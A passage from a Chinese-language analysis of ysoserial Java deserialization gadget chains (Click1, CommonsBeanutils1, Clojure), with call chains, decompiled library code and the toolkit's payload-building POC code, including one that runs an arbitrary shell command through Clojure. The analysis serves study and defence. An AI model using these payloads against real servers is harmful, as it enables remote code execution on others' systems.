class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getProperty</span><span class="params">(String name, Object row)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (row <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">        <span class="type">Map</span> <span class="variable">map</span> <span class="operator">=</span> (Map)row;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> map.get(name);</span><br><span class="line">        <span class="keyword">if</span> (object != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">upperCaseName</span> <span class="operator">=</span> name.toUpperCase();</span><br><span class="line">            object = map.get(upperCaseName);</span><br><span class="line">            <span class="keyword">if</span> (object != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> object;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="type">String</span> <span class="variable">lowerCaseName</span> <span class="operator">=</span> name.toLowerCase();</span><br><span class="line">                object = map.get(lowerCaseName);</span><br><span class="line">                <span class="keyword">return</span> object != <span class="literal">null</span> ? object : <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">// 直接执行这里</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.methodCache == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>.methodCache = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> PropertyUtils.getValue(row, name, <span class="built_in">this</span>.methodCache);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>将传入的 name 参数值赋给 basePart 变量，并在调用 getObjectPropertyValue 方法时作为参数传入。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getValue</span><span class="params">(Object source, String name, Map cache)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">basePart</span> <span class="operator">=</span> name;</span><br><span class="line">    <span class="type">String</span> <span class="variable">remainingPart</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (source <span class="keyword">instanceof</span> Map) &#123;</span><br><span class="line">        <span class="keyword">return</span> ((Map)source).get(name);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">baseIndex</span> <span class="operator">=</span> name.indexOf(<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (baseIndex != -<span class="number">1</span>) &#123;</span><br><span class="line">            basePart = name.substring(<span class="number">0</span>, baseIndex);</span><br><span class="line">            remainingPart = name.substring(baseIndex + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getObjectPropertyValue(source, basePart, cache);  # 这里</span><br><span class="line">        <span class="keyword">return</span> remainingPart != <span class="literal">null</span> &amp;&amp; value != <span class="literal">null</span> ? getValue(value, remainingPart, cache) : value;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>cache 是初始化的 HashMap 对象，所以从中获取不到任何缓存方法，因此会调用 source.getClass().getMethod(ClickUtils.toGetterName(name)) 方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> Object <span class="title function_">getObjectPropertyValue</span><span class="params">(Object source, String name, Map cache)</span> &#123;</span><br><span class="line">    PropertyUtils.<span class="type">CacheKey</span> <span class="variable">methodNameKey</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertyUtils</span>.CacheKey(source, name);</span><br><span class="line">    <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        method = (Method)cache.get(methodNameKey);</span><br><span class="line">        <span class="keyword">if</span> (method == <span class="literal">null</span>) &#123;</span><br><span class="line">            method = source.getClass().getMethod(ClickUtils.toGetterName(name));    <span class="comment">// 这里</span></span><br><span class="line">            cache.put(methodNameKey, method);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">return</span> method.invoke(source);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException var13) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            method = source.getClass().getMethod(ClickUtils.toIsGetterName(name));</span><br><span class="line">            cache.put(methodNameKey, method);</span><br><span class="line">            <span class="keyword">return</span> method.invoke(source);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var11) &#123;</span><br><span class="line">            String msg;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                method = source.getClass().getMethod(name);</span><br><span class="line">                cache.put(methodNameKey, method);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(source);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var9) &#123;</span><br><span class="line">                msg = <span class="string">&quot;No matching getter method found for property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; on class &quot;</span> + source.getClass().getName();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(msg);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var10) &#123;</span><br><span class="line">                msg = <span class="string">&quot;Error getting property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; from &quot;</span> + source.getClass();</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(msg, var10);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var12) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Error getting property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; from &quot;</span> + source.getClass();</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(msg, var12);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var14) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Error getting property &#x27;&quot;</span> + name + <span class="string">&quot;&#x27; from &quot;</span> + source.getClass();</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(msg, var14);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该方法是为传入的 property 属性头部添加 <code>get</code> 三个字符再返回，因此回到 getObjectPropertyValue 方法中调用method.invoke(source) 方法时，method 参数值对应的是 “get” + 传入的 name 变量。</p><p>而这里 name 变量值是由 Column#name 属性值决定的，因此控制 Column#name 属性值就可以调用任意类中以 <code>get</code> 开头的无参方法。可以直接通过构造函数控制 Column#name 属性。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">toGetterName</span><span class="params">(String property)</span> &#123;</span><br><span class="line">    <span class="type">HtmlStringBuffer</span> <span class="variable">buffer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HtmlStringBuffer</span>(property.length() + <span class="number">3</span>);</span><br><span class="line">    buffer.append(<span class="string">&quot;get&quot;</span>);</span><br><span class="line">    buffer.append(Character.toUpperCase(property.charAt(<span class="number">0</span>)));</span><br><span class="line">    buffer.append(property.substring(<span class="number">1</span>));</span><br><span class="line">    <span class="keyword">return</span> buffer.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h2><blockquote><p>思路同 CC2、Click1<br>改用 BeanComparator 作为比较器</p></blockquote><p>适用版本</p><ul><li>commons-beanutils:1.9.2</li><li>commons-collections:3.1</li><li>commons-logging:1.2</li></ul><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    PriorityQueue.readObject()</span><br><span class="line">      PriorityQueue.heapify()</span><br><span class="line">        PriorityQueue.siftDown()</span><br><span class="line">          PriorityQueue.siftDownUsingComparator()</span><br><span class="line">            BeanComparator.compare()</span><br><span class="line">                PropertyUtils.getProperty()</span><br><span class="line">                    PropertyUtilsBean.getProperty()</span><br><span class="line">                        PropertyUtilsBean.getNestedProperty()</span><br><span class="line">                            PropertyUtilsBean.getSimpleProperty()</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.getOutputProperties()</span><br><span class="line">                                        ...</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/OAfq1WD6UhIbRQv.png" ><p>ysoserial.payloads.CommonsCollections7#getObject 和 CC2 基本相同，中间使用 BeanComparator 作为比较器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String command)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="comment">// 承载恶意代码</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">Object</span> <span class="variable">templates</span> <span class="operator">=</span> Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 比较器</span></span><br><span class="line"><span class="comment">// mock method name until armed</span></span><br><span class="line"><span class="keyword">final</span> <span class="type">BeanComparator</span> <span class="variable">comparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BeanComparator</span>(<span class="string">&quot;lowestSetBit&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建优先队列</span></span><br><span class="line">    <span class="comment">// create queue with numbers and basic comparator</span></span><br><span class="line"><span class="keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;Object&gt;(<span class="number">2</span>, comparator);</span><br><span class="line"><span class="comment">// stub data for replacement later</span></span><br><span class="line">queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line">queue.add(<span class="keyword">new</span> <span class="title class_">BigInteger</span>(<span class="string">&quot;1&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置比较器调用 getoutputProperties 方法</span></span><br><span class="line">    <span class="comment">// switch method called by comparator</span></span><br><span class="line">Reflections.setFieldValue(comparator, <span class="string">&quot;property&quot;</span>, <span class="string">&quot;outputProperties&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 替换队列中的数据</span></span><br><span class="line">    <span class="comment">// switch contents of queue</span></span><br><span class="line"><span class="keyword">final</span> Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, <span class="string">&quot;queue&quot;</span>);</span><br><span class="line">queueArray[<span class="number">0</span>] = templates;</span><br><span class="line">queueArray[<span class="number">1</span>] = templates;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> queue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>BeanComparator#compare 方法中调用了 PropertyUtils.getProperty 获取属性</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">compare</span><span class="params">(T o1, T o2)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.property == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.internalCompare(o1, o2);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value1</span> <span class="operator">=</span> PropertyUtils.getProperty(o1, <span class="built_in">this</span>.property);   <span class="comment">// 这里</span></span><br><span class="line">            <span class="type">Object</span> <span class="variable">value2</span> <span class="operator">=</span> PropertyUtils.getProperty(o2, <span class="built_in">this</span>.property);</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.internalCompare(value1, value2);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException var5) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;IllegalAccessException: &quot;</span> + var5.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InvocationTargetException var6) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;InvocationTargetException: &quot;</span> + var6.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NoSuchMethodException var7) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;NoSuchMethodException: &quot;</span> + var7.toString());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PropertyUtils#getProperty 方法创建 PropertyUtilsBean，并调用其 getProperty 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">    <span class="keyword">return</span> PropertyUtilsBean.getInstance().getProperty(bean, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PropertyUtilsBean#getProperty 方法用于执行任务，调用 getNestedProperty 方法。具体是调用 getSimpleProperty 方法，然后调用对象的 getter 方法获取属性，实际调用 TemplatesImpl.getOutputProperties</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Object <span class="title function_">getProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.getNestedProperty(bean, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Clojure"><a href="#Clojure" class="headerlink" title="Clojure"></a>Clojure</h2><blockquote><p>Clojure 是 Lisp 编程语言在 Java 平台上的现代、动态及函数式方言；说白了就是用 Clojure 在 Java 中执行 Lisp 代码。<br>利用 HashMap 返序列化执行 hashCode 方法的特性，将其替换为调用 AbstractTableModel$ff19274a.hashCode</p></blockquote><p>适用版本</p><ul><li>clojure:1.8.0</li></ul><p>利用链</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">HashMap.readObject()</span><br><span class="line">AbstractTableModel$ff19274a.hashCode()</span><br><span class="line">clojure.core$comp$fn__4727.invoke()</span><br><span class="line">clojure.core$constantly$fn__4614.invoke()</span><br><span class="line">clojure.main$eval_opt.invoke()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/hIj4DHVNTepsAaw.png" ><p>ysoserial.payloads.Clojure#getObject 返回的 targetMap(HashMap) 包含 <code>model(AbstractTableModel$ff19274a) -&gt; null</code> 的映射，model.__initClojureFnMappings &#x3D; fnMap(HashMap)，fnMap中的键为 hashCode，值为 g、f(core$comp$fn__4727)。</p><p>反序列化时调用 HashMap.readObject，进一步调用 AbstractTableModel$ff19274a.hashCode，因为 __clojureFnMap 有值所以调用 core$comp$fn__4727.invoke 最终调用的是构造的 <code>clojure.core\$comp().invoke(clojure.main\$eval_opt(), clojure.core\$constantly().invoke(clojurePayload))</code>。clojure.core$constantly().invoke(clojurePayload) 返回 core$constantly$fn__4614 对象，其属性 x 为构造的 payload，后续进入 clojure.main$eval_opt().invokeStatic 的 for 循环时执行指令。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AbstractTableModel$ff19274a</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var10000</span> <span class="operator">=</span> RT.get(<span class="built_in">this</span>.__clojureFnMap, <span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> var10000 != <span class="literal">null</span> ? ((Number)((IFn)var10000).invoke(<span class="built_in">this</span>)).intValue() : <span class="built_in">super</span>.hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// core$comp$fn__4727</span></span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> ((IFn)<span class="built_in">this</span>.f).invoke(((IFn)<span class="built_in">this</span>.g).invoke());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object x)</span> &#123;</span><br><span class="line">    <span class="type">IFn</span> <span class="variable">var10000</span> <span class="operator">=</span> (IFn)<span class="built_in">this</span>.f;</span><br><span class="line">    <span class="type">IFn</span> <span class="variable">var10001</span> <span class="operator">=</span> (IFn)<span class="built_in">this</span>.g;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var10002</span> <span class="operator">=</span> x;</span><br><span class="line">    x = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">return</span> var10000.invoke(var10001.invoke(var10002));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main$eval_opt</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">invokeStatic</span><span class="params">(Object str)</span> &#123;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">eof</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="type">Object</span> <span class="variable">var10004</span> <span class="operator">=</span> str;</span><br><span class="line">    str = <span class="literal">null</span>;</span><br><span class="line">    <span class="type">Object</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">LineNumberingPushbackReader</span>((Reader)(<span class="keyword">new</span> <span class="title class_">StringReader</span>((String)var10004)));</span><br><span class="line">    push_thread_bindings.invokeStatic(hash_map.invokeStatic(ArraySeq.create(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;const__2, Util.equiv(const__4, const__2.get()) ? Boolean.TRUE : const__2.get()&#125;)));</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">Object</span> <span class="variable">input</span> <span class="operator">=</span> ((IFn)(<span class="keyword">new</span> <span class="title class_">main$eval_opt$fn__7422</span>(reader, eof))).invoke(); !Util.equiv(input, eof); input = ((IFn)(<span class="keyword">new</span> <span class="title class_">main$eval_opt$fn__7424</span>(reader, eof))).invoke()) &#123; <span class="comment">// 执行指令</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">var10000</span> <span class="operator">=</span> input;</span><br><span class="line">        input = <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> eval.invokeStatic(var10000);</span><br><span class="line">        <span class="keyword">if</span> (Util.identical(value, (Object)<span class="literal">null</span>)) &#123;</span><br><span class="line">            var10000 = <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object[] var5 = <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">1</span>];</span><br><span class="line">            <span class="type">Object</span> <span class="variable">var10003</span> <span class="operator">=</span> value;</span><br><span class="line">            value = <span class="literal">null</span>;</span><br><span class="line">            var5[<span class="number">0</span>] = var10003;</span><br><span class="line">            prn.invokeStatic(ArraySeq.create(var5));</span><br><span class="line">        &#125;</span><br><span class="line">        push_thread_bindings.invokeStatic(hash_map.invokeStatic(ArraySeq.create(<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;const__2, Util.equiv(const__4, const__2.get()) ? Boolean.TRUE : const__2.get()&#125;)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// core$constantly$fn__4614</span></span><br><span class="line"><span class="keyword">public</span> core$constantly$fn__4614(Object var1) &#123;</span><br><span class="line">    <span class="built_in">this</span>.x = var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC 构造如下，注释掉其中两行也可以执行成功</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;?, ?&gt; getObject(<span class="keyword">final</span> String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 转义</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> Strings.join(Arrays.asList(command.replaceAll(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;\\\\\\\\&quot;</span>).replaceAll(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\&quot;</span>).split(<span class="string">&quot; &quot;</span>)), <span class="string">&quot; &quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 在 Clojure 包中调用 shell 命令</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">clojurePayload</span> <span class="operator">=</span></span><br><span class="line">        String.format(<span class="string">&quot;(use &#x27;[clojure.java.shell :only [sh]]) (sh %s)&quot;</span>, cmd);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 初始化</span></span><br><span class="line">    Map&lt;String, Object&gt; fnMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;String, Object&gt;();</span><br><span class="line"><span class="comment">// fnMap.put(&quot;hashCode&quot;, new clojure.core$constantly().invoke(0));</span></span><br><span class="line">    </span><br><span class="line">    <span class="type">AbstractTableModel$ff19274a</span> <span class="variable">model</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AbstractTableModel$ff19274a</span>();</span><br><span class="line"><span class="comment">// model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));</span></span><br><span class="line">    </span><br><span class="line">    HashMap&lt;Object, Object&gt; targetMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;Object, Object&gt;();</span><br><span class="line">targetMap.put(model, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加到 Map 中</span></span><br><span class="line">    fnMap.put(<span class="string">&quot;hashCode&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">clojure</span>.core$comp().invoke(</span><br><span class="line"><span class="keyword">new</span> <span class="title class_">clojure</span>.main$eval_opt(),    <span class="comment">// 函数体为空</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">clojure</span>.core$constantly().invoke(clojurePayload))); <span class="comment">// core$constantly 函数体为空</span></span><br><span class="line">    <span class="comment">// 通过 PersistentArrayMap 转换 fnMap 的属性</span></span><br><span class="line">model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> targetMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>clojure.core$constantly().invoke(clojurePayload) 实际调用 core$constantly$fn__4614(clojurePayload)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">core$constantly</span> <span class="keyword">extends</span> <span class="title class_">AFunction</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> core$constantly() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">invokeStatic</span><span class="params">(Object x)</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span 